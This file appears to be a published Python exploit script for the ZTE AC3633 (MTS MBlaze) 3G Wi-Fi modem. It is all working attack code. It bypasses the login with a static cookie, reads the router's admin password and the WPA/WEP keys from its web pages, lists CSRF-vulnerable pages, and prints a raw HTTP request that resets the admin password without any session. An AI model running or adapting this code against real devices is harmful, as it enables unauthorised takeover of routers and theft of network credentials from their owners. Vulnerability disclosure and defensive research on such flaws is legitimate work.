#Author: Ajin Abraham - xboz
#http://opensecurity.in
#Product MTS MBlaze 3G Wi-Fi Modem
#System Version 107
#Manufacturer ZTE
#Model 	AC3633
import requests
import os
import urllib2
print "MTS MBlaze Ultra Wi-Fi / ZTE AC3633 Exploit"
print "Vulnerabilities"
print "Login Bypass | Router Credential Stealing | Wi-Fi Password Stealing | CSRF | Reset Password without old password and Session\n"
url='http://192.168.1.1'
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""
#Vulnerable Static Cookies
cookies = dict(iusername='logined')
#Login Bypass
login_url = url+'/en/index.asp'
print "\nAttempting Login :"+url
print '================='
try:
    response=urllib2.urlopen(url,timeout=1)
except:
    print "Cannot Reach : "+url
    exit
r = requests.get(login_url, cookies=cookies)
print 'Status : ' + str(r.status_code)
if "3g.asp" in r.text:
     print "Login Sucessfull!"
#Information Gathering
print "\nInformation"
print "========="
info_url=url+'/en/3g.asp'
i= requests.get(info_url, cookies=cookies)
ip=find_between(i.text,'"g3_ip" disabled="disabled" style="background:#ccc;" size="16" maxlength="15" value="','"></td>')
subnet =find_between(i.text,'"g3_mask" disabled="disabled" style="background:#ccc;"  size="16" maxlength="15" value="','"></td>')
gateway=find_between(i.text,'"g3_gw" disabled="disabled" style="background:#ccc;"  size="16" maxlength="15" value="','"></td>')
print "IP : " +ip
print "Subnet : "+subnet
print "Gateway : " +gateway
#Steal Login Password
print "\nStealing Router Login Credentials"
print "======================"
login_pwd_url=url+'/en/password.asp'
p = requests.get(login_pwd_url, cookies=cookies)
print 'Status : ' + str(p.status_code)
print 'Username :  admin' #default
passwd=find_between(p.text,'id="sys_password" value="','"/>')
print 'Password : '+ passwd
print '\nExtracting WPA/WPA2 PSK Key'
print '================='
#Wi-Fi Password Extraction
wifi_pass_url=url+'/en/wifi_security.asp'
s = requests.get(wifi_pass_url, cookies=cookies)
print 'Status: ' + str(s.status_code)
wpa=find_between(s.text,"wpa_psk_key]').val('","');")
wep=find_between(s.text,"wep_key]').val('","');")
print "WPA/WPA2 PSK : " + wpa
print "WEP Key : " + wep

print "\nOther Vulnerabilities"
print "======================="
print "\n1.Cross Site Request Forgery in:\n\nhttp://192.168.1.1/en/dhcp_reservation.asp\nhttp://192.168.1.1/en/mac_filter.asp \nhttp://192.168.1.1/en/password.asp"
print "\n2.Password Reset without old password and Session"
print """
POST /goform/formSyWebCfg HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.1/en/password.asp
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,es;q=0.6,ms;q=0.4
Content-Length: 52

action=Apply&sys_cfg=changed&sys_password=mblazetestpassword
"""